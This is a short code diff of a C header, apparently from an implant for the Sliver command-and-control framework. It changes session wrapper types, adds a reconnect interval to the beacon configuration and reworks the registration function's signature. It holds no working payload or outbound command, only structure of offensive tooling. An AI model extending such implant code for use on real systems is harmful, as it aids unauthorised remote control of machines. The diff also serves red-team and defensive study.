@@ -1,7 +1,7 @@
 #pragma once
 
 typedef struct _ENVELOPE ENVELOPE, *PENVELOPE;
-typedef struct _ENVELOPE_WRAPPER ENVELOPE_WRAPPER, * PENVELOPE_WRAPPER;
+typedef struct _SESSION_WORK_WRAPPER SESSION_WORK_WRAPPER, * PSESSION_WORK_WRAPPER;
 typedef struct _URI URI, * PURI;
 typedef struct _WEB_PROXY WEB_PROXY, * PWEB_PROXY;
 typedef struct _SLIVER_DRIVE_CLIENT SLIVER_DRIVE_CLIENT, * PSLIVER_DRIVE_CLIENT;
@@ -24,6 +24,7 @@ struct _GLOBAL_CONFIG {
 	LPSTR lpServerMinisignPublicKey;
 	DWORD dwPollInterval;
 	DWORD dwMaxFailure;
+	DWORD dwReconnectInterval;
 };
 
 typedef struct _SLIVER_RESP {
@@ -53,10 +54,9 @@ typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
 #include "Uri.h"
 #include "Session.h"
 
-PBYTE RegisterSliver
+PBUFFER RegisterSliver
 (
-	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
-	_In_ PDWORD pcbOutput
+	_In_ PGLOBAL_CONFIG pConfig
 );
 
 PBUFFER MarshalEnvelope
